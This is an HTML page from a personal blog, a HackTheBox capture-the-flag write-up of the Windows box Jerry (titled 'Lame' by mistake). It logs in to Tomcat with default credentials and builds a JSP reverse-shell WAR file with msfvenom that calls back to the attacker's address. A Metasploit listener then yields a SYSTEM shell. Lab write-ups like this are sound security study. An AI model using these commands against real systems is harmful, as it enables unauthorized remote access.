@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+    }
+
+    img {
+        width: 80%
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Lame</h1>
+        <img class="box-icon" src="../images/jerry.png"></img>
+        <p><i>Compromised on September 6, 2022</br>Written on January 21, 2024</i></p>
+        <p>
+            Jerry was my 2nd box to hack on HackTheBox. This box is very easy, possibly one of the easiest boxes on the platform.
+            This box features a Windows environment, running a web application named Apache Tomcat which is still configured with
+            default credentials. A quick Google search will show the username and password. After that, it's simply using msfvenom
+            to create a malicious .war file, uploading it, and navigating to the new directory to execute the payload.
+        </p>
+
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Starting off with Nmap, only port 8080 is open. </p>
+        <pre><code>nmap 10.10.10.95 -Pn -p- --min-rate 5000</code></pre>
+        <img src="../images/jerry1.png">
+        <p>I quickly use Nmap to scan the version and use available scripts to pull more information about the service. It looks
+            like this service is running Apache Tomcat 7.0.88, a web server.
+        </p>
+        <pre><code>nmap 10.10.10.95 -Pn -p8080 -sC -sV</code></pre>
+        <img src="../images/jerry2.png">
+        
+        <h3>Apache Tomcat - TCP 8080</h3>
+        <p>Visiting http://10.10.10.95:8080 shows a default installation of Tomcat.</p>
+        <img src="../images/jerry3.png">
+        <p>Poking around, the "Manager App" button brings a username and password prompt.</p>
+        <img src="../images/jerry4.png">
+        <p>A quick Google search "tomcat default password" results in a list of possible credentials to try. </p>
+        <img src="../images/jerry5.png">
+        <p>From that list, the credentials "tomcat/s3cret" works. We now have access to Tomcat Web Application Manager.</p>
+        <img src="../images/jerry6.png">
+
+        <h2>Exploiting Tomcat</h2>
+        <p>The Tomcat Web Application Manager allows the user configure applications which can be visited via path. To deploy an
+            application, the user can either specify a URL that points to a directory or .war file on the server. Uploading a
+            .war file is also an option. I can use this to my advantage and upload a malicious .war file. </p>
+        <img src="../images/jerry7.png">
+        <p>Using msfvenom, I create a malicious .war file. This file has a reverse shell payload that calls back to my machine, allowing
+            me to remotely execute commands on the target machine. I'll give it a not-so-suspicious name: backup.war</p>
+        <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f war -o backup.war</code></pre>
+        <img src="../images/jerry8.png">
+        <p>Uploading the .war file succeeds. There is a new path listed with our filename. If I navigate to http://10.10.10.95.8080/backup, 
+            the payload executes.</p>
+        <img src="../images/jerry9.png">
+        <p>Before visiting my uploaded application, I'll use Metasploit to set up my listener to catch the callback from my payload.</p>
+        <pre><code>msfconsole</br>use multi/handler</br>set payload java/jsp_shell_reverse_tcp</br>set lhost 10.10.14.3</br>set lport 4444</br>run</code></pre>
+        <img src="../images/jerry10.png">
+        <p>Now that my listener is running, I visit my uploaded application at http://10.10.10.95:8080/backup which executes the payload. Within a few seconds, I get a shell on
+            the target machine as the user NT AUTHORITY\SYSTEM. This user has the highest privileges possible, even more than Administrator.</p>
+        <img src="../images/jerry11.png">
+        <p>Root and user flags are captured.</p>
+        <pre><code>cd C:\Users\Administrator\Desktop</br>dir</br>more root.txt && more user.txt</code></pre>
+        <img src="../images/jerry12.png">
+        <p>Full compromise.</p>
+    </div>
+</body>
+
+</html>
